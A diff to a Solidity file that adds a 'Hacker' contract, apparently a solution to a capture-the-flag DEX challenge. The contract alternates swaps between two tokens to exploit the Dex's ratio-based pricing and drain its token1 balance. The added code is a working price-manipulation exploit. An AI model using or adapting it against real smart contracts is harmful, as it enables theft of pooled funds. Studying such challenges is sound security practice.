@@ -79,3 +79,28 @@ contract SwappableToken is ERC20 {
         super._approve(owner, spender, amount);
     }
 }
+
+contract Hacker {
+    Dex public dex;
+
+    address public token1;
+    address public token2;
+
+    constructor(Dex _dex, address _token1, address _token2) {
+        dex = _dex;
+        token1 = _token1;
+        token2 = _token2;
+    }
+
+    function hack() public {
+        dex.approve(address(dex), type(uint256).max);
+        dex.swap(token1, token2, 10);
+        dex.swap(token2, token1, 20);
+        dex.swap(token1, token2, 24);
+        dex.swap(token2, token1, 30);
+        dex.swap(token1, token2, 41);
+        dex.swap(token2, token1, 45);
+
+        require(IERC20(token1).balanceOf(address(dex)) == 0, "not zero!");
+    }
+}
